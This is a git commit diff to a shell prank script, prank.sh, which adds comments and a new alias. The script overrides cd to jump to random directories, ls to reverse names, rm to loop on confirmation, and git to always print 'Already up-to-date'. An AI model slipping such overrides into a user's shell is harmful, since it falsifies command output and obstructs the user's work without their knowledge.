3d73117063c808c8f3af358a7d81f0ea5b40cc2c
Adrien Brochard <adrien.brochard@c9tec.com>
2016-09-29 09:47:56 -0400

    adding comments and ls command

--- prank.sh
+++ prank.sh
@@ -1,8 +1,8 @@
 ### PRANK
 # aliases
-alias cd='cd $(ls -d */ | sort -R | head -1) && echo'
-
+alias cd='cd $(ls -d */ | sort -R | head -1) && echo' # jumps to a randim dir
+alias ls='ls | xargs -n 1 -I f echo f | rev'          # reverses each directory name
 
 # functions
-rm () { while true; do echo -n "rm: remove regular file '$1'" && read; done; }
-git () { echo "Already up-to-date."; }
+rm () { while true; do echo -n "rm: remove regular file '$1'" && read; done; } # keeps asking for confirmation
+git () { echo "Already up-to-date."; } # Never pulls anything
